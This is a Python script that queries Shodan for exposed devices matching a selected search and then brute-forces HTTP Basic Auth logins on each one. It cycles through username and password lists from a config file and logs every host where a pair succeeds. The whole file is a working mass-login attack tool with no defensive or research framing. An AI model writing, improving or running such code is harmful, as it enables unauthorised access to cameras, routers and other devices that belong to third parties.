import ipaddress
import json
import os
import requests
from datetime import datetime
from shodan import Shodan, APIError

api = Shodan("")
currentTime = datetime.now().strftime("%Y-%m-%d %H-%M-%S.%f")
response = ""

with open("options.json") as jsonFile:
    options = json.load(jsonFile)

with open("methods.json") as jsonFile:
    methods = json.load(jsonFile)

if (os.path.isdir("logs") == False):
    os.makedirs("logs")

def attemptLogin(link: str):
    try:
        option = options[int(response) - 1]
        usernames = option["usernames"]
        passwords = option["passwords"]

        for username in usernames:
            for password in passwords:
                req = requests.get(link, auth=requests.auth.HTTPBasicAuth(username, password), timeout=5)
                
                if (req.status_code == 200):
                    return (username, password)
        
        return False
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        return False
    
def createLog(name: str, line: str):
    folder = f"logs/{currentTime}"
    file = f"{folder}/{name}.txt"

    if (os.path.isdir(folder) == False):
        os.makedirs(folder)

    with open(file, "a") as file:
        file.write(line + "\n")

def hasPrompt(link: str):
    try:
        req = requests.get(link, timeout=5)
        return (req.status_code == 401)
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        return False
    
def isIPv4(ip: str):
    try:
        ip_object = ipaddress.ip_address(ip)
        return (type(ip_object) == ipaddress.IPv4Address)
    except ValueError:
        return False

def isKeyValid():
    try:
        api.info()
    except:
        return False
    
    return True

def log(ip_str: str, foundMethod: bool, ableToLogin = None, error: requests.exceptions = None):
    if (foundMethod == True):
        if (hasattr(ableToLogin, "__len__")):
            username = ableToLogin[0]
            password = ableToLogin[1]

            print(f"{ip_str} - {username}:{password}")
            createLog("Successful", f"{ip_str} - {username}:{password}")
        else:
            print(f"Failed to login into {ip_str}")
            createLog("Failed", ip_str)
    else:
        if (error == requests.exceptions.Timeout):
            print(f"{ip_str} timed out")
            createLog("Timeout", ip_str)
        elif (error == requests.exceptions.ConnectionError):
            print(f"There was a connection error with {ip_str}")
            createLog("Connection Error", ip_str)
        else:
            print(f"No method to login was found for {ip_str}")
            createLog("No Method", ip_str)

def validateResponse():
    if (response != "" and response.isnumeric()):
        return (int(response) > 0 and int(response) <= len(options))
    else:
        return False

if (os.path.isfile("key.txt")):
    with open("key.txt", "r") as file:
        api = Shodan(file.read())

while (isKeyValid() == False):
    os.system("cls")
    api = Shodan(input("Insert your Shodan API key: "))

with open("key.txt", "w") as file:
    file.write(api.api_key)

while (validateResponse() == False):
    os.system("cls")
    print("OPTIONS:")

    for i in range(1, len(options) + 1):
        print(f"{i} - {options[i - 1]["name"]}")

    response = input("Select a option: ")

os.system("cls")

try:
    results = api.search(options[i - 1]["search"])

    for result in results["matches"]:
        if (isIPv4(result["ip_str"])):
            ip_str = f"{result["ip_str"]}:{result["port"]}"
            foundMethod = False

            if (result["port"] == "443"):
                link = f"https://{ip_str}"
            else:
                link = f"http://{ip_str}"

            for method in methods:
                if (hasPrompt(link + method)):
                    foundMethod = True
                    log(ip_str=ip_str, foundMethod=foundMethod, ableToLogin=attemptLogin(link + method))

            if (foundMethod == False):
                try:
                    req = requests.get(link, timeout=5)
                    log(ip_str=ip_str, foundMethod=foundMethod)
                except requests.exceptions.Timeout:
                    log(ip_str=ip_str, foundMethod=foundMethod, error=requests.exceptions.Timeout)
                except requests.exceptions.ConnectionError:
                    log(ip_str=ip_str, foundMethod=foundMethod, error=requests.exceptions.ConnectionError)
except APIError as e:
    print(f'Error: {e}')